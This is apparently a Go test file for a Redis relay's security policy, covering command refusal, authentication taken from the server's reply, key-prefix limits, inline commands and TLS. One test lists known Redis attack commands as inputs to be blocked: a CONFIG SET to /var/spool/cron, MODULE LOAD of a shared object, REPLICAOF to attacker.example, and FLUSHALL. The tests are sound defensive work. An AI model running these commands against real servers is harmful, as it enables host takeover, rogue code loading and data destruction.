package redis

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"errors"
	"fmt"
	"net"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/rom/xproxy/internal/proxy"
	"github.com/rom/xproxy/internal/proxytest"
	wire "github.com/rom/xproxy/internal/respwire"
	"github.com/rom/xproxy/internal/testutil"
)

// fakeServer is a Redis: enough of one to answer commands, accept or refuse a
// credential, and record every command that reached it.
//
// What got through is the assertion that matters. A test that checked only the
// client's error would pass against a relay that answered a refusal and forwarded
// the command anyway, which is the bug that actually happens.
type fakeServer struct {
	ln net.Listener
	// password, when set, makes the server refuse an AUTH that does not match --
	// which is how the relay's "has this connection authenticated" is tested
	// against the server's answer rather than against the attempt.
	password string

	mu   sync.Mutex
	cmds []string
	keys []string
}

func startFake(t *testing.T, s *fakeServer) *fakeServer {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	s.ln = ln
	t.Cleanup(func() { _ = ln.Close() })
	go s.serve()
	return s
}

func (s *fakeServer) addr() string { return s.ln.Addr().String() }

func (s *fakeServer) serve() {
	for {
		c, err := s.ln.Accept()
		if err != nil {
			return
		}
		go s.session(c)
	}
}

func (s *fakeServer) session(c net.Conn) {
	defer func() { _ = c.Close() }()
	rd := wire.NewReader(c, wire.MaxMessage, wire.MaxBulk, wire.MaxElements)
	for {
		cmd, err := rd.Next()
		if err != nil {
			return
		}
		s.mu.Lock()
		s.cmds = append(s.cmds, cmd.String())
		if ks, ok := wire.Keys(cmd); ok {
			s.keys = append(s.keys, ks...)
		}
		s.mu.Unlock()

		var reply []byte
		switch cmd.Name {
		case "AUTH":
			pw := ""
			switch len(cmd.Args) {
			case 1:
				pw = string(cmd.Args[0])
			case 2:
				pw = string(cmd.Args[1])
			}
			if s.password != "" && pw != s.password {
				reply = wire.Error("WRONGPASS", "invalid username-password pair")
			} else {
				reply = []byte("+OK\r\n")
			}
		case "HELLO":
			reply = []byte("+hello\r\n")
		case "GET":
			// A simple string rather than a bulk one, so every reply this
			// fixture sends is a single line: the client below reads one line per
			// command, and a two-line reply would leave its tail in the buffer
			// and desynchronise every assertion after it.
			reply = []byte("+val\r\n")
		default:
			reply = []byte("+OK\r\n")
		}
		if _, err = c.Write(reply); err != nil {
			return
		}
	}
}

func (s *fakeServer) saw() (cmds, keys []string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	return append([]string(nil), s.cmds...), append([]string(nil), s.keys...)
}

const redisYAML = `
version: 1
server:
  listeners:
    - name: cache
      address: "127.0.0.1:0"
      kind: redis
      redis:
%s
logging: {access: {enabled: false}}
upstreams:
  - {name: rd, endpoints: [{address: %q}]}
`

func relayFor(t *testing.T, section, serverAddr string) (*proxy.Server, string) {
	t.Helper()
	s := proxytest.Start(t, fmt.Sprintf(redisYAML, section, serverAddr))
	return s, proxytest.Addr(t, s, "cache")
}

// base is a listener with the transport security off, because every test using it
// is about the policy rather than the transport and a fixture running a TLS stack
// to check a command allow list would be testing crypto/tls.
const base = "        upstream: rd\n" +
	"        require_tls: false\n" +
	"        require_auth: false\n" +
	"        default_action: allow\n"

// client is a minimal Redis client.
type client struct {
	c  net.Conn
	br *bufio.Reader
}

func dial(t *testing.T, addr string) *client {
	t.Helper()
	c, err := net.Dial("tcp", addr)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = c.Close() })
	_ = c.SetDeadline(time.Now().Add(10 * time.Second))
	return &client{c: c, br: bufio.NewReader(c)}
}

// do sends a command and reads one reply line, which is enough: every reply this
// fixture's server sends begins with its whole meaning on the first line.
func (cl *client) do(t *testing.T, parts ...string) string {
	t.Helper()
	var b bytes.Buffer
	fmt.Fprintf(&b, "*%d\r\n", len(parts))
	for _, p := range parts {
		fmt.Fprintf(&b, "$%d\r\n%s\r\n", len(p), p)
	}
	if _, err := cl.c.Write(b.Bytes()); err != nil {
		t.Fatalf("%v: %v", parts, err)
	}
	line, err := cl.br.ReadString('\n')
	if err != nil {
		t.Fatalf("%v: %v", parts, err)
	}
	return strings.TrimRight(line, "\r\n")
}

// send writes raw octets, for the forms a well-behaved client would not produce.
func (cl *client) send(t *testing.T, raw string) string {
	t.Helper()
	if _, err := cl.c.Write([]byte(raw)); err != nil {
		t.Fatal(err)
	}
	line, err := cl.br.ReadString('\n')
	if err != nil {
		t.Fatalf("%q: %v", raw, err)
	}
	return strings.TrimRight(line, "\r\n")
}

func refused(reply string) bool { return strings.HasPrefix(reply, "-") }

// The ordinary path: allowed commands reach the server and their replies come
// back.
func TestAnAllowedSessionReachesTheServer(t *testing.T) {
	s := startFake(t, &fakeServer{})
	_, addr := relayFor(t, base, s.addr())
	cl := dial(t, addr)
	if got := cl.do(t, "PING"); got != "+OK" {
		t.Fatalf("PING answered %q", got)
	}
	if got := cl.do(t, "SET", "session:abc", "v"); got != "+OK" {
		t.Fatalf("SET answered %q", got)
	}
	if got := cl.do(t, "GET", "session:abc"); got != "+val" {
		t.Fatalf("GET answered %q", got)
	}
	cmds, keys := s.saw()
	if strings.Join(cmds, ",") != "PING,SET,GET" {
		t.Fatalf("the server saw %v", cmds)
	}
	if strings.Join(keys, ",") != "session:abc,session:abc" {
		t.Fatalf("keys %v", keys)
	}
}

// CONFIG SET dir is the one everybody knows, and it is refused by default with
// nothing reaching the server.
func TestAWayOutOfTheDatabaseGoesNoFurther(t *testing.T) {
	s := startFake(t, &fakeServer{})
	_, addr := relayFor(t, base, s.addr())
	cl := dial(t, addr)
	for _, parts := range [][]string{
		{"CONFIG", "SET", "dir", "/var/spool/cron"},
		{"CONFIG", "SET", "dbfilename", "root"},
		{"SAVE"},
		{"MODULE", "LOAD", "/tmp/x.so"},
		{"EVAL", "return redis.call('flushall')", "0"},
		{"REPLICAOF", "attacker.example", "6379"},
		{"FLUSHALL"},
		{"KEYS", "*"},
		{"MONITOR"},
	} {
		reply := cl.do(t, parts...)
		if !refused(reply) {
			t.Errorf("%v answered %q", parts, reply)
		}
		if !strings.Contains(reply, "NOPERM") {
			t.Errorf("%v: %q is not the kind a client library reports as a refusal", parts, reply)
		}
	}
	if cmds, _ := s.saw(); len(cmds) != 0 {
		t.Fatalf("commands reached the server: %v", cmds)
	}
	// And the connection survives every refusal, which is what makes a policy
	// usable: a relay that closed on the first one would turn a refused command
	// into an outage.
	if got := cl.do(t, "PING"); got != "+OK" {
		t.Fatalf("the connection did not survive: %q", got)
	}
}

// Monitor mode enforces nothing -- except the decisions where forwarding the
// command and writing down that it was noticed is not a trial of anything.
func TestMonitorModeStillRefusesTheDangerousSet(t *testing.T) {
	s := startFake(t, &fakeServer{})
	_, addr := relayFor(t, base+"        monitor_only: true\n"+
		"        read_only: true\n", s.addr())
	cl := dial(t, addr)

	// A write is noticed and forwarded: that is what monitor mode is for.
	if got := cl.do(t, "SET", "k", "v"); got != "+OK" {
		t.Fatalf("SET answered %q", got)
	}
	// A command merely off the allow list is forwarded too.
	if got := cl.do(t, "GETRANGE", "k", "0", "1"); got != "+OK" {
		t.Fatalf("GETRANGE answered %q", got)
	}
	// The ways out are not.
	for _, parts := range [][]string{
		{"CONFIG", "SET", "dir", "/tmp"}, {"FLUSHALL"}, {"KEYS", "*"},
		{"EVAL", "return 1", "0"},
	} {
		if reply := cl.do(t, parts...); !refused(reply) {
			t.Errorf("%v answered %q in monitor mode", parts, reply)
		}
	}
	cmds, _ := s.saw()
	if strings.Join(cmds, ",") != "SET,GETRANGE" {
		t.Fatalf("the server saw %v", cmds)
	}
}

// require_auth refuses a command before the connection has authenticated, and
// takes the answer from the *server* rather than from having seen an AUTH.
//
// A relay that trusted the attempt would treat a wrong password as a login, which
// is the whole of what the setting exists to prevent.
func TestAuthenticationIsTakenFromTheServersAnswer(t *testing.T) {
	s := startFake(t, &fakeServer{password: "hunter2"})
	section := "        upstream: rd\n" +
		"        require_tls: false\n" +
		"        default_action: allow\n"
	_, addr := relayFor(t, section, s.addr())

	// A command before any AUTH.
	cl := dial(t, addr)
	if reply := cl.do(t, "GET", "k"); !refused(reply) {
		t.Fatalf("an unauthenticated GET answered %q", reply)
	}
	// A *wrong* password: the server refuses it, so the connection is still
	// unauthenticated and the next command is still refused.
	if reply := cl.do(t, "AUTH", "wrong"); !refused(reply) {
		t.Fatalf("a wrong password answered %q", reply)
	}
	if reply := cl.do(t, "GET", "k"); !refused(reply) {
		t.Fatalf("a GET after a refused AUTH answered %q -- the relay believed the attempt", reply)
	}
	// The right one, and then commands go.
	if reply := cl.do(t, "AUTH", "hunter2"); reply != "+OK" {
		t.Fatalf("the right password answered %q", reply)
	}
	if reply := cl.do(t, "GET", "k"); reply != "+val" {
		t.Fatalf("a GET after a good AUTH answered %q", reply)
	}
	cmds, _ := s.saw()
	// The AUTHs reached the server -- they have to, it is the only thing that can
	// judge a password -- and the GETs before the good one did not.
	if strings.Join(cmds, ",") != "AUTH,AUTH,GET" {
		t.Fatalf("the server saw %v", cmds)
	}
}

// The key prefix policy, end to end, and the command it refuses rather than
// checking against the wrong argument.
func TestTheKeyPrefixPolicyEndToEnd(t *testing.T) {
	s := startFake(t, &fakeServer{})
	_, addr := relayFor(t, base+
		"        allow_key_prefixes: [\"app:\"]\n"+
		"        allow_commands: [GET, SET, MGET, MSET, PING, SORT]\n", s.addr())
	cl := dial(t, addr)

	if got := cl.do(t, "GET", "app:1"); got != "+val" {
		t.Fatalf("an allowed key answered %q", got)
	}
	for _, parts := range [][]string{
		{"GET", "other:1"},
		{"MGET", "app:1", "other:2"},
		{"MSET", "app:1", "v", "other:2", "v"},
		// The keys of a SORT depend on whether STORE is present, so the relay
		// will not check one argument and hope.
		{"SORT", "app:list", "STORE", "other:dest"},
		{"SORT", "app:list"},
	} {
		if reply := cl.do(t, parts...); !refused(reply) {
			t.Errorf("%v answered %q", parts, reply)
		}
	}
	_, keys := s.saw()
	for _, k := range keys {
		if !strings.HasPrefix(k, "app:") {
			t.Fatalf("a key outside the allowed prefix reached the server: %q", k)
		}
	}
}

// A message that is not RESP is answered the way the server would answer, because
// a client library reports a protocol error and reconnects rather than hanging.
func TestSomethingThatIsNotRESPIsAnsweredAndTheConnectionEnds(t *testing.T) {
	s := startFake(t, &fakeServer{})
	_, addr := relayFor(t, base, s.addr())
	for _, raw := range []string{
		"*99999999\r\n",
		"*1\r\n$99999999\r\n",
		"*1\r\n$3\r\nGETX\n",
		"*-1\r\n",
		"\xcd\n",
	} {
		cl := dial(t, addr)
		reply := cl.send(t, raw)
		if !strings.HasPrefix(reply, "-ERR") {
			t.Errorf("%q answered %q, want a protocol error", raw, reply)
		}
	}
	if cmds, _ := s.saw(); len(cmds) != 0 {
		t.Fatalf("something reached the server: %v", cmds)
	}
}

// The inline form is refused by default, and the relay reads it in order to refuse
// it: a relay that ignored the form would pass it straight through.
func TestTheInlineFormIsRefusedByDefaultAndReadToDoIt(t *testing.T) {
	s := startFake(t, &fakeServer{})
	_, addr := relayFor(t, base, s.addr())
	cl := dial(t, addr)
	if reply := cl.send(t, "PING\r\n"); !refused(reply) {
		t.Fatalf("an inline PING answered %q", reply)
	}
	// The same command as a multibulk goes, so the refusal is about the form.
	if got := cl.do(t, "PING"); got != "+OK" {
		t.Fatalf("%q", got)
	}
	// Named, the inline form works -- including the dangerous-command policy
	// applying to it, which is the reason reading it matters at all.
	_, addr2 := relayFor(t, base+"        allow_inline: true\n", s.addr())
	cl2 := dial(t, addr2)
	if got := cl2.send(t, "PING\r\n"); got != "+OK" {
		t.Fatalf("inline PING with allow_inline: %q", got)
	}
	if reply := cl2.send(t, "FLUSHALL\r\n"); !refused(reply) {
		t.Fatalf("an inline FLUSHALL answered %q", reply)
	}
	cmds, _ := s.saw()
	for _, c := range cmds {
		if c == "FLUSHALL" {
			t.Fatal("an inline FLUSHALL reached the server")
		}
	}
}

// require_tls with no certificate cannot serve anybody, so the listener refuses to
// start rather than failing every connection with a message in a log nobody is
// reading yet.
func TestRequireTLSWithoutACertificateRefusesToStart(t *testing.T) {
	s := startFake(t, &fakeServer{})
	_, err := proxytest.TryStart(fmt.Sprintf(redisYAML,
		"        upstream: rd\n        require_tls: true\n", s.addr()))
	if err == nil {
		t.Fatal("a listener requiring tls without a certificate started")
	}
	if !strings.Contains(err.Error(), "require_tls") {
		t.Fatalf("the error does not name the setting: %v", err)
	}
}

// max_commands bounds a connection, for a bastion front where a session is a
// person rather than a pool.
func TestMaxCommandsEndsTheConnection(t *testing.T) {
	s := startFake(t, &fakeServer{})
	_, addr := relayFor(t, base+"        max_commands: 3\n", s.addr())
	cl := dial(t, addr)
	for i := 0; i < 3; i++ {
		if got := cl.do(t, "PING"); got != "+OK" {
			t.Fatalf("command %d answered %q", i+1, got)
		}
	}
	if reply := cl.do(t, "PING"); !refused(reply) {
		t.Fatalf("the fourth answered %q", reply)
	}
	if cmds, _ := s.saw(); len(cmds) != 3 {
		t.Fatalf("the server saw %d commands", len(cmds))
	}
}

// deny_response: drop closes without a reply, for an estate that would rather a
// prober learn nothing.
func TestDropSaysNothing(t *testing.T) {
	s := startFake(t, &fakeServer{})
	_, addr := relayFor(t, base+"        deny_response: drop\n", s.addr())
	cl := dial(t, addr)
	var b bytes.Buffer
	b.WriteString("*1\r\n$8\r\nFLUSHALL\r\n")
	if _, err := cl.c.Write(b.Bytes()); err != nil {
		t.Fatal(err)
	}
	_ = cl.c.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
	if _, err := cl.br.ReadString('\n'); err == nil {
		t.Fatal("drop sent a reply")
	} else if !isTimeout(err) && !errors.Is(err, net.ErrClosed) && err.Error() != "EOF" {
		t.Logf("ended with %v, which is not a reply either", err)
	}
	if cmds, _ := s.saw(); len(cmds) != 0 {
		t.Fatalf("the command reached the server: %v", cmds)
	}
}

func isTimeout(err error) bool {
	var ne net.Error
	return errors.As(err, &ne) && ne.Timeout()
}

// TLS from the first octet, end to end, and the setting it makes possible.
//
// Redis defines no in-protocol upgrade, so a TLS listener is a separate port and
// the handshake is the first thing on the connection -- which means the kind has
// to terminate it, because the engine hands the kind a plain connection and a
// certificate. This test exists because I wrote the kind without that step at
// first: everything below passed except this, and `require_tls` was a setting
// nothing could ever satisfy.
func TestTheClientsTLSIsTerminatedAndRequireTLSIsSatisfiable(t *testing.T) {
	s := startFake(t, &fakeServer{})
	dir := t.TempDir()
	cert, key := testutil.WriteCert(t, dir, "cache.test")
	section := "        upstream: rd\n" +
		"        require_tls: true\n" +
		"        require_auth: false\n" +
		"        read_only: true\n" +
		"        default_action: allow\n" +
		fmt.Sprintf("      tls: {certificates: [{cert_file: %s, key_file: %s}]}\n", cert, key)
	srv := proxytest.Start(t, fmt.Sprintf(redisYAML, section, s.addr()))
	addr := proxytest.Addr(t, srv, "cache")

	raw, err := net.Dial("tcp", addr)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = raw.Close() }()
	_ = raw.SetDeadline(time.Now().Add(10 * time.Second))
	tc := tls.Client(raw, &tls.Config{ServerName: "cache.test", InsecureSkipVerify: true}) //nolint:gosec // the fixture's certificate is self-signed
	if err := tc.Handshake(); err != nil {
		t.Fatalf("handshake: %v", err)
	}
	cl := &client{c: tc, br: bufio.NewReader(tc)}

	// The connection is secure, so require_tls is satisfied and the policy runs.
	if got := cl.do(t, "GET", "k"); got != "+val" {
		t.Fatalf("a read over TLS answered %q", got)
	}
	// And read_only still applies, which is the point: the transport being right
	// does not make the policy stop.
	if reply := cl.do(t, "SET", "k", "v"); !refused(reply) {
		t.Fatalf("a write over TLS answered %q", reply)
	}
	cmds, _ := s.saw()
	if strings.Join(cmds, ",") != "GET" {
		t.Fatalf("the server saw %v", cmds)
	}

	// A plaintext client on the same port gets no further than the handshake:
	// what it sends is not a ClientHello, so there is nothing to negotiate.
	plain, err := net.Dial("tcp", addr)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = plain.Close() }()
	_ = plain.SetDeadline(time.Now().Add(3 * time.Second))
	if _, err = plain.Write([]byte("*1\r\n$4\r\nPING\r\n")); err != nil {
		t.Fatal(err)
	}
	buf := make([]byte, 64)
	if n, err := plain.Read(buf); err == nil && n > 0 && buf[0] == '+' {
		t.Fatalf("a plaintext client got a reply: %q", buf[:n])
	}
	if cmds, _ = s.saw(); strings.Join(cmds, ",") != "GET" {
		t.Fatalf("the plaintext client reached the server: %v", cmds)
	}
}
